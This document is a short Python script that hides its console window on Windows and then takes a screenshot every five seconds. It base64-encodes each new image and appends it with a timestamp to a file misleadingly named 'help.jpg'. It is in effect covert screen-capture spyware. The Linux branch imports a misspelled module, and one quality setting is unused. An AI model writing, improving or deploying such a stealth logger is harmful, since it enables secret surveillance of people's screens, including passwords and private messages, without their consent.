import sys, time, base64, io
from datetime import datetime
from io import BytesIO

platform= sys.platform
if platform == 'win32':
    import win32gui, win32console
    from desktopmagic.screengrab_win32 import (getScreenAsImage)
else: #linux
    import pyscreent as ImageGrab 

lstImg = ' '
flePath = "help.jpg"
dur = 5 #how often to grab a screenshot 
imgQly = 10 #image quality 

def hideWindow():   
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True
    
def writeData(data):
    with open(flePath, 'a') as fle:
        fle.write(data)
    fle.close()
 

if platform == 'win32':
    hideWindow()
while True:
    if platform == 'win32':
        img = getScreenAsImage()
    else: #linux
        img = ImageGrab.grab() 
            
    buf = BytesIO()
    img.save(buf,format='JPEG' )
    img64 = str(base64.b64encode(buf.getvalue()).decode())
    if lstImg != img64:
        lstImg = img64
        writeData('::s::' + str(datetime.now())+ '\n' + str(img64) + '\n' )
    time.sleep(dur)
 
    
 